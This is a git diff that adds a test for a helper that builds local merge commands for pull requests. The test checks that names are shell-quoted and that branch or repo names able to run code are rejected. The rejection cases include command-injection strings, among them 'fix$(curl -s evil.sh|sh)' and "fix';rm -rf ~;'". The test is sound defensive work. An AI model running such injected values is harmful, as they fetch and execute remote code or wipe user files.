@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 import test from 'node:test';
-import { conflictFileAction, describeConflictError } from '../lib/conflict-flow';
+import { conflictFileAction, describeConflictError, localMergeCommands, shellQuote } from '../lib/conflict-flow';
 
 void test('each file state has one next action; Mark reviewed waits for the result to be shown', () => {
   const base = { otherFilesPending: true };
@@ -50,4 +50,21 @@ void test('errors use plain copy and keep the raw output for Details', () => {
     describeConflictError('Select an unresolved text file.', { stage: 'other' }).title,
     'Select an unresolved text file.'
   );
+});
+
+void test('local merge commands quote every name, and refuse names a shell could run', () => {
+  const same = { headRepo: 'klang/engine', baseRepo: 'klang/engine', headBranch: 'feature/retry', baseBranch: 'main' };
+  assert.equal(
+    localMergeCommands(same),
+    "git switch 'feature/retry'\ngit pull\ngit fetch origin 'main'\ngit merge 'origin/main'"
+  );
+  assert.equal(
+    localMergeCommands({ ...same, headRepo: 'ana/engine' }),
+    "git switch 'feature/retry'\ngit pull\ngit fetch 'https://github.com/klang/engine.git' 'main'\ngit merge FETCH_HEAD"
+  );
+  // A branch name from the PR's author that would run code when pasted: no commands at all.
+  for (const headBranch of ['fix$(curl -s evil.sh|sh)', 'fix`id`', "fix';rm -rf ~;'", 'fix branch', 'fix\nrm'])
+    assert.equal(localMergeCommands({ ...same, headBranch }), undefined, headBranch);
+  assert.equal(localMergeCommands({ ...same, baseRepo: 'klang/engine;id' }), undefined);
+  assert.equal(shellQuote("it's"), "'it'\\''s'");
 });
